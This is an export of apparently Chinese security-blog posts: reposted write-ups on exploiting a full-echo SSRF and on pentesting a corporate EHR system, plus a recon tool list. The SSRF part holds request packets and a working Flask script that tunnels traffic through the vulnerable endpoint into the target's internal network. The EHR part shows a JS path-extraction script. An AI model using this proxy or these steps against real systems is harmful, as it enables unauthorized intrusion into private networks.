<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">domain2Ip</span>(<span class="params">domain</span>):</span><br><span class="line">    ip_list = []</span><br><span class="line">    items = socket.getaddrinfo(domain, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> items:</span><br><span class="line">        <span class="keyword">if</span> ip[<span class="number">4</span>][<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> ip_list:</span><br><span class="line">            ip_list.append(ip[<span class="number">4</span>][<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> ip_list</span><br><span class="line">domain2Ip(<span class="string">&#x27;www.baidu.com&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>Goby、<a href="">OneforAll</a><a href="https://github.com/EASY233/Finger">Finger</a>、<a href="https://github.com/wgpsec/ENScan_GO">ENScan_Go</a>、<a href="https://github.com/Taonn/EmailAll">EmailAll</a>、<a href="https://github.com/ccc-f/FCDN">FCDN</a>、<a href="https://github.com/ffuf/ffuf">ffuf</a></p>
<p><a href="https://phonebook.cz/">pohonebook</a>、<a href="https://lzpan.com/">懒盘搜索</a>、<a href="http://www.yunpz.net/">云铺子</a>、<a href="https://www.lingfengyun.com/">凌风云</a></p>
<h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><p>码一下为什么有些企业的邮箱无法验证有效性</p>
<p><a href="mailto:&#x43;&#x61;&#105;&#119;&#106;&#x40;&#108;&#x69;&#98;&#121;&#46;&#99;&#111;&#x6d;&#46;&#99;&#x6e;">&#x43;&#x61;&#105;&#119;&#106;&#x40;&#108;&#x69;&#98;&#121;&#46;&#99;&#111;&#x6d;&#46;&#99;&#x6e;</a></p>
<p><a href="mailto:&#x72;&#x7a;&#x68;&#114;&#64;&#x67;&#x69;&#105;&#104;&#103;&#46;&#x63;&#x6f;&#x6d;">&#x72;&#x7a;&#x68;&#114;&#64;&#x67;&#x69;&#105;&#104;&#103;&#46;&#x63;&#x6f;&#x6d;</a></p>
<p>项目 <a href="https://github.com/Tzeross/verifyemail">https://github.com/Tzeross/verifyemail</a></p>
<h3 id="解决的问题"><a href="#解决的问题" class="headerlink" title="解决的问题"></a>解决的问题</h3><p>批量邮箱验证</p>
<p>cdn、云waf、saaswaf 检测</p>
]]></content>
      <categories>
        <category>实习系列</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>转载|WEB非实用之SSRF的挖掘与利用</title>
    <url>/posts/88a26dbe.html</url>
    <content><![CDATA[<blockquote>
<p>  通过接口管理写一个python代理来访问目标内网，思路非常棒。</p>
<p>  <a href="https://www.yuque.com/pmiaowu/bomi9w/mbs0gw">https://www.yuque.com/pmiaowu/bomi9w/mbs0gw</a></p>
</blockquote>
<h1 id="WEB非实用之SSRF的挖掘与利用"><a href="#WEB非实用之SSRF的挖掘与利用" class="headerlink" title="WEB非实用之SSRF的挖掘与利用"></a>WEB非实用之SSRF的挖掘与利用</h1><h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>SSRF (Server-Side Request Forgery:服务器端请求伪造)</p>
<p>是一种由攻击者构造形成，由服务端发起请求的一个安全漏洞</p>
<p>原因是由于服务端提供了从其他服务器应用获取数据的功能且没有对地址和协议等做过滤和限制</p>
<p>本文讲解一个ssrf的挖掘方法与一个全回显ssrf的利用方法</p>
<h1 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 前期渗透时,利用目标ssrf扫描内网存活主机或端口</span><br><span class="line">2. 如果站点是php的利用Gopher协议,去尝试攻击内网</span><br><span class="line">3. 搭建代理</span><br></pre></td></tr></table></figure>

<h1 id="0x03-漏洞局限性"><a href="#0x03-漏洞局限性" class="headerlink" title="0x03 漏洞局限性"></a>0x03 漏洞局限性</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 大部分情况下都是GET型ssrf漏洞,仅能探测存活，扫描端口、内网域名探测,危害十分有限</span><br><span class="line">2. https请求ssl证书无法正常解析</span><br></pre></td></tr></table></figure>

<h1 id="0x04-漏洞分类"><a href="#0x04-漏洞分类" class="headerlink" title="0x04 漏洞分类"></a>0x04 漏洞分类</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssrf的类型现在通常分为:</span><br><span class="line">1. 可回显型</span><br><span class="line">2. 非回显型</span><br><span class="line"></span><br><span class="line">在实战中,非回显型的ssrf用处属实不大,也就不详讲了</span><br></pre></td></tr></table></figure>

<h1 id="0x05-例子"><a href="#0x05-例子" class="headerlink" title="0x05 例子"></a>0x05 例子</h1><h2 id="0x05-1-例子-另类ssrf挖掘"><a href="#0x05-1-例子-另类ssrf挖掘" class="headerlink" title="0x05.1 例子: 另类ssrf挖掘"></a>0x05.1 例子: 另类ssrf挖掘</h2><p>首先看一个平平无奇的数据包:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: dss0.xxxxxx.com</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache,no-transform</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/WEB%E9%9D%9E%E5%AE%9E%E7%94%A8%E4%B9%8BSSRF%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%A9%E7%94%A8/1639969883997-650d2109-9d7f-4cf3-84c5-8c3860f6663a.png" alt="img"></p>
<p>这样看这个站点平平无奇</p>
<p>但是如果我们把 GET &#x2F; HTTP&#x2F;1.1 改成 GET <a href="http://xxxx.com/">http://xxxx.com</a> HTTP&#x2F;1.1 呢? 说试就试,这里我改成我的vps</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/WEB%E9%9D%9E%E5%AE%9E%E7%94%A8%E4%B9%8BSSRF%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%A9%E7%94%A8/1639969937164-3fabc93c-c1b6-475a-8465-f8581c55ff4d.png" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/WEB%E9%9D%9E%E5%AE%9E%E7%94%A8%E4%B9%8BSSRF%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%A9%E7%94%A8/1639970002675-68664c8e-1ca2-4650-af7f-ed51c46bb942.png" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/WEB%E9%9D%9E%E5%AE%9E%E7%94%A8%E4%B9%8BSSRF%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%A9%E7%94%A8/1639970045142-bc87055c-267c-4578-9b2f-d3167e053b76.png" alt="img"></p>
<p>可以看到的却是收到了请求,也就是说,我们在这个平平无奇的地方,挖掘到了一个ssrf</p>
<p>那么在试试访问其它站点</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/WEB%E9%9D%9E%E5%AE%9E%E7%94%A8%E4%B9%8BSSRF%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%A9%E7%94%A8/1639970079742-5bcfbfe6-7129-43a4-8995-8029b9e1919b.png" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/WEB%E9%9D%9E%E5%AE%9E%E7%94%A8%E4%B9%8BSSRF%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%A9%E7%94%A8/1639970116709-25ee5ba1-3e60-4162-b8c2-ec6e5b1e334e.png" alt="img"></p>
<p>一样可以解析,这样就说明,我们挖掘到了一个全回显的ssrf,那么我们如果要进行下一步的话</p>
<p>是不是就可以通过这个全回显,去尝试构造一个代理了</p>
<h2 id="0x05-2-例子-一处全回显的ssrf搭代理"><a href="#0x05-2-例子-一处全回显的ssrf搭代理" class="headerlink" title="0x05.2 例子: 一处全回显的ssrf搭代理"></a>0x05.2 例子: 一处全回显的ssrf搭代理</h2><p>迎面看到一个接口管理的功能:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/WEB%E9%9D%9E%E5%AE%9E%E7%94%A8%E4%B9%8BSSRF%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%A9%E7%94%A8/1639970190577-0a11c7c5-5046-4d33-936b-949f5baedb8b.png" alt="img"></p>
<p>尝试进行内网域名扫描:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssrf漏洞数据包:</span><br><span class="line">POST /api/invokeHttp HTTP/1.1 </span><br><span class="line">Host: api.xxx.com</span><br><span class="line">Content-Length: 134</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0 4389.9 Safari/537.36</span><br><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Cookie: 1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;jsonParam&quot;:&quot;&quot;,&quot;headers&quot;:[],&quot;files&quot;: [],&quot;url&quot;:&quot;http://info.xx.com/&quot;,&quot;requestType&quot;:&quot;GET&quot;,&quot;body&quot;:&quot;&quot;,&quot;ip&quot;:&quot;&quot;,&quot;port&quot;:&quot;80&quot;,&quot;forma t&quot;:&quot;utf-8&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">响应包:</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: openresty</span><br><span class="line">Date: Sun, 31 Jan 2021 15:57:57 GMT</span><br><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line">Content-Length: 244</span><br><span class="line">Connection: close</span><br><span class="line">Access-Control-Allow-Origin: http://poc-intest.xx.com</span><br><span class="line">Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE</span><br><span class="line">Access-Control-Max-Age: 0</span><br><span class="line">Access-Control-Allow-Headers: Authorization,Origin, No-Cache, X-Requested-With, If- Modified-Since, Pragma, Last-Modified, Cache-Control, Expires, Content-Type, X-E4M- With,userId,token</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">XDomainRequestAllowed: 1</span><br><span class="line">Expires: Sun, 31 Jan 2021 15:57:57 GMT</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">&#123;&quot;code&quot;:1,&quot;data&quot;:&quot;Http Get| url:http://info.xx.com/ | e:org.apache.http.conn.HttpHostConnectException: Connect to info.xx.com:80 [info.xx.com/172.26.202.55, info.xx.com/172.26.202.48] failed: &quot;&quot;,&quot;message&quot;:&quot;访问成功&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>其中data字段就是调用接口以后返回的响应包</p>
<p>通过这个一点,我们就可以自己构造一下,写出一个基于python的代理出来代码如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, Response, make_response</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> splitext, basename</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_filetype</span>(<span class="params">url</span>):</span><br><span class="line">    content_type = <span class="string">&#x27;text/html&#x27;</span></span><br><span class="line">    response_mimetype = &#123;</span><br><span class="line">        <span class="string">&#x27;.png&#x27;</span>: <span class="string">&#x27;image/png&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.js&#x27;</span>: <span class="string">&#x27;application/javascript&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.jpg&#x27;</span>: <span class="string">&#x27;image/jpeg&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.gif&#x27;</span>: <span class="string">&#x27;image/gif&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.jpeg&#x27;</span>: <span class="string">&#x27;image/jpeg&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.ico&#x27;</span>: <span class="string">&#x27;image/x-icon&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.css&#x27;</span>: <span class="string">&#x27;text/css&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.svg&#x27;</span>: <span class="string">&#x27;image/svg+xml&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    disassembled = urlparse(url)</span><br><span class="line">    filename, file_ext = splitext(basename(disassembled.path))</span><br><span class="line">    content_type = response_mimetype.get(file_ext, <span class="string">&#x27;text/html&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> content_type</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">before_request</span>():</span><br><span class="line">    proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;127.0.0.1:8080&#x27;</span>, <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;127.0.0.1:8080&#x27;</span>&#125;</span><br><span class="line">    data = request.data <span class="keyword">or</span> request.form <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    dest_url = <span class="string">&#x27;http://api.xxx.com/api/invokeHttp&#x27;</span></span><br><span class="line">    ssrfhd = &#123;<span class="string">&quot;header&quot;</span>: <span class="string">&quot;cookie&quot;</span>,</span><br><span class="line">              <span class="string">&quot;value&quot;</span>: <span class="string">&quot;username.test=ext.bmw.test;&quot;</span>&#125;</span><br><span class="line">    ssrfhedlist = []</span><br><span class="line">    filist = []</span><br><span class="line">    ssrfhedlist.append(ssrfhd)</span><br><span class="line">    dest_data = &#123;</span><br><span class="line">        <span class="string">&#x27;url&#x27;</span>:  request.url,</span><br><span class="line">        <span class="string">&#x27;requestType&#x27;</span>: request.method.lower(),</span><br><span class="line">        <span class="string">&#x27;files&#x27;</span>: filist,</span><br><span class="line">        <span class="string">&#x27;body&#x27;</span>: data,</span><br><span class="line">        <span class="string">&#x27;jsonParam&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;headers&#x27;</span>: ssrfhedlist,</span><br><span class="line">        <span class="string">&#x27;format&#x27;</span>: <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    headers = <span class="built_in">dict</span>()</span><br><span class="line">    <span class="keyword">for</span> name, value <span class="keyword">in</span> request.headers:</span><br><span class="line">        headers[name] = value</span><br><span class="line">    headers[<span class="string">&#x27;Cookie&#x27;</span>] = <span class="string">&#x27;key1=value1;key2=value2;&#x27;</span></span><br><span class="line">    headers[<span class="string">&#x27;Host&#x27;</span>] = <span class="string">&#x27;api.xxx.com&#x27;</span></span><br><span class="line">    headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line"></span><br><span class="line">    resp = requests.post(url=dest_url, headers=headers,</span><br><span class="line">                         json=dest_data, proxies=proxies)</span><br><span class="line"></span><br><span class="line">    new_headers = &#123;**resp.headers, <span class="string">&#x27;Content-Type&#x27;</span>: get_filetype(request.url)&#125;</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Content-Encoding&#x27;</span> <span class="keyword">in</span> new_headers.keys():</span><br><span class="line">        <span class="keyword">del</span> new_headers[<span class="string">&#x27;Content-Encoding&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> resp.status_code == <span class="string">&quot;302&quot;</span>:</span><br><span class="line">        resp_content_modify_html = <span class="string">&quot;302&quot;</span></span><br><span class="line">        <span class="keyword">return</span> resp_content_modify_html, resp.status_code, new_headers</span><br><span class="line">    resp_content_modify = json.loads(resp.content)</span><br><span class="line">    resp_content_modify_html = resp_content_modify[<span class="string">&quot;data&quot;</span>].replace(<span class="string">&quot;/n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> resp_content_modify_html, resp.status_code, new_headers</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(port=<span class="number">8081</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>构造完毕以后,像正常使用代理一样连接即可</p>
<p>连接以后,通过该代理,就可以访问对方内网了</p>
<p>例如:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/WEB%E9%9D%9E%E5%AE%9E%E7%94%A8%E4%B9%8BSSRF%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%A9%E7%94%A8/1639970416041-fcc7df42-d67b-4ac4-9788-151043d61b93.png" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/WEB%E9%9D%9E%E5%AE%9E%E7%94%A8%E4%B9%8BSSRF%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%A9%E7%94%A8/1639970461882-0717b027-a7c9-49bc-901b-e1c7bc7b6761.png" alt="img"></p>
<p>通过ssrf搭建代理挖掘的注入</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/WEB%E9%9D%9E%E5%AE%9E%E7%94%A8%E4%B9%8BSSRF%E7%9A%84%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%A9%E7%94%A8/1639970540086-927a81fd-9558-4433-848f-8a636d5e1882.png" alt="img"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>基础漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>一次对企业内部EHR系统的渗透测试</title>
    <url>/posts/f2659b63.html</url>
    <content><![CDATA[<h1 id="转载-一次对企业内部EHR系统的渗透测试"><a href="#转载-一次对企业内部EHR系统的渗透测试" class="headerlink" title="转载|一次对企业内部EHR系统的渗透测试"></a>转载|一次对企业内部EHR系统的渗透测试</h1><blockquote>
<p>  转载自：<a href="https://xz.aliyun.com/t/11943">https://xz.aliyun.com/t/11943</a></p>
<p>  作者：icepaper</p>
<p>  文章精华：python 脚本提取 webpack js 文件里面的接口，</p>
</blockquote>
<h2 id="1、渗透前言"><a href="#1、渗透前言" class="headerlink" title="1、渗透前言"></a>1、渗透前言</h2><p>对EHR系统访问时，首先是需要一个登录的，作为企业员工，大部分系统接入了SSO，该EHR系统为了保证安全性也不例外。因此对该系统的渗透测试基础的前提是————在该系统拥有一个可登录的凭据，但是该凭据并未拥有任何权限。</p>
<p>如下所示，正常的企业员工登录该系统时都是没有访问权限的。<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20221211195454-a0aa582c-794a-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20221211195454-a0aa582c-794a-1.png" alt="img"></a></p>
<p>那么对该类系统对其渗透的第一步必定是打开F12观察JS，发现JS目录下仅有6个JS文件</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20221211195506-a78966ce-794a-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20221211195506-a78966ce-794a-1.png" alt="img"></a></p>
<p>而右击源代码查看的JS里却有几十个chun-xxxxxx.js<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20221211195640-dfa25ab6-794a-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20221211195640-dfa25ab6-794a-1.png" alt="img"></a></p>
<p>随便打开了一个chunk-xxxxxx.js，利用插件发现存在一些路径但是在F12里搜不到，也就意味着这么多个chunk我要一个个打开看，才能够测试得比较仔细。<br> 如下所示：</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20221211195704-ee1dfe24-794a-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20221211195704-ee1dfe24-794a-1.png" alt="img"></a></p>
<h2 id="2、packerFuzzer"><a href="#2、packerFuzzer" class="headerlink" title="2、packerFuzzer"></a>2、packerFuzzer</h2><p>接口太多了用了，先使用一下packerFuzzer来看看是否有未授权访问</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20221211195715-f4b95332-794a-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20221211195715-f4b95332-794a-1.png" alt="img"></a></p>
<p>很轻松的收获了两枚任意文件上传漏洞，不过其中一个是放到minio下的，直接下载，而且是springboot的任意文件上传，利用相对局限。</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20221211195722-f8bcd274-794a-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20221211195722-f8bcd274-794a-1.png" alt="img"></a></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20221211195729-fcfe0722-794a-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20221211195729-fcfe0722-794a-1.png" alt="img"></a></p>
<h2 id="3、JS获取"><a href="#3、JS获取" class="headerlink" title="3、JS获取"></a>3、JS获取</h2><p>开始对JS进行发现<br> 这么多chunk-xxx.js，直接在首页使用插件来提取了一批路径，但是众所周知，该插件提取的路径其实并是完整的。</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20221211195813-16e854a8-794b-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20221211195813-16e854a8-794b-1.png" alt="img"></a></p>
<p>一个简单的例子如下，这个路径就没被正则匹配到，想要提取完整的还得进入一个个js里查看。</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20221211195819-1adce2d6-794b-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20221211195819-1adce2d6-794b-1.png" alt="img"></a></p>
<p>用packerFuzzer里存储的db直接拿到所有的JS的路径，当然packerfuzzer也会自动下载文本。</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20221211195825-1e20d34e-794b-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20221211195825-1e20d34e-794b-1.png" alt="img"></a></p>
<p>只能一个个对chunk-xxx.js文件进行发现，但是js文件又太多了，足足有90多个，因此写了一个简单的python脚本批量提取了一下路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import json</span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&quot;&#125;</span><br><span class="line"></span><br><span class="line">fileurl=sys.argv[1]</span><br><span class="line"></span><br><span class="line">filemkdir=fileurl.split(&#x27;_&#x27;)[0]</span><br><span class="line">if not os.path.exists(filemkdir):</span><br><span class="line">    os.makedirs(filemkdir)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 下载chunk.js</span><br><span class="line"># with open (str(fileurl)) as furl:</span><br><span class="line">#   url=furl.readlines()</span><br><span class="line">#   print(str(url)+&quot;---is---downloading&quot;)</span><br><span class="line">#   for url in url:</span><br><span class="line">#       url=url.strip(&#x27;\n&#x27;)</span><br><span class="line">#       file=url.split(&#x27;/&#x27;)[-1]</span><br><span class="line"></span><br><span class="line">#       resp = requests.get(url)</span><br><span class="line">#       html = resp.text</span><br><span class="line"></span><br><span class="line">#       with open (&quot;./&quot;+filemkdir+&quot;/&quot;+file,&quot;a&quot;,encoding=&quot;utf-8&quot;) as f1:</span><br><span class="line">#           f1.write(html)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#get path  + 路径名称</span><br><span class="line">paths=[]</span><br><span class="line">for dirpath, dirnames, filenames in os.walk(&#x27;./&#x27;+filemkdir):</span><br><span class="line">    for file in filenames:</span><br><span class="line">        with open(&quot;./&quot;+filemkdir+&quot;/&quot;+file,&quot;r&quot;,encoding=&#x27;gb18030&#x27;, errors=&#x27;ignore&#x27;) as f2:</span><br><span class="line">            try:</span><br><span class="line">                line=f2.readlines()</span><br><span class="line">                for line in line:</span><br><span class="line">                    line=line.strip(&#x27;\n&#x27;).strip(&#x27;\t&#x27;)</span><br><span class="line">                    #print(line)</span><br><span class="line">                    p =  re.findall(&#x27;&#x27;&#x27;([&#x27;&quot;]\/[^][^&gt;&lt; \)\(\&#123;\&#125;]*?[&#x27;&quot;])&#x27;&#x27;&#x27;,line)</span><br><span class="line">                    #print(p)</span><br><span class="line">                    if p != None:</span><br><span class="line">                        #print(p)</span><br><span class="line">                        for path in p:</span><br><span class="line">                            path=path.replace(&#x27;:&quot;&#x27;,&quot;&quot;).replace(&#x27;&quot;&#x27;,&quot;&quot;)</span><br><span class="line">                            paths.append(file+&quot;---&quot;+path)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                print(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for var in sorted(set(paths)):</span><br><span class="line">    with open (fileurl+&#x27;_path.txt&#x27;,&quot;a+&quot;,encoding=&#x27;gb18030&#x27;, errors=&#x27;ignore&#x27;) as paths:</span><br><span class="line">        paths.write(var+&#x27;\n&#x27;)</span><br></pre></td></tr></table></figure>

<p>效果大概是这样，再稍微处理一下，去除一些重复的和一看就是无用的接口后，直接丢进去Burp里跑一下</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20221211195903-34f3c8c4-794b-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20221211195903-34f3c8c4-794b-1.png" alt="img"></a></p>
<p>最后有300多个接口，直接丢到Burp里跑就行了 post请求和get请求<br> 结果绝大部分是服务异常，可能是需要某些参数来触发</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20221211195928-438f26ee-794b-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20221211195928-438f26ee-794b-1.png" alt="img"></a></p>
<p>几个返回大量数据的都是如下的资料，比如公司的职位信息，编号等等，没有敏感的个人讯息相关。</p>
